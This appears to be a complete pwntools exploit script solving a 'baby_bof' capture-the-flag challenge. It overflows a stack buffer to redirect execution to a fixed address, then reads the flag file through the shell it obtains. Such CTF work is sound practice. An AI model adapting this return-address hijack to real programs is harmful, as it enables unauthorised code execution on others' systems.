from pwn import *

r = remote('final.ctf.bitx.tw', 20000)
#r = process('./baby_bof')

padding = 'Z'*(100//0x10*0x10+0x10)
addr = 0x00400636
payload = padding.encode() + p64(addr)
r.sendlineafter(' = ', payload)
r.sendlineafter('\n', b'cat /home/baby_bof/flag')
flag = r.recvuntil('}').decode()
print(flag)
